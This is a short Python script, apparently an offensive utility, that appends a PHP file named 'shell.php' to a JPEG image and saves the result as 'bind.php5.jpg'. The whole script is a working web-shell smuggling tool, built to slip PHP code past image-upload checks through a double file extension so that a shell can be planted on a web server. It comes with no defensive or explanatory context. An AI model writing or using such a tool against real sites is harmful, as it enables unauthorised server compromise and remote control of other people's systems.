#! usage: python script.py image.jpg shell.php
from sys import argv
script, img, shell = argv
i = open(img,'rb').read()
i += open(shell,'rb').read()
f = open('bind.php5.jpg','wb').write(i)
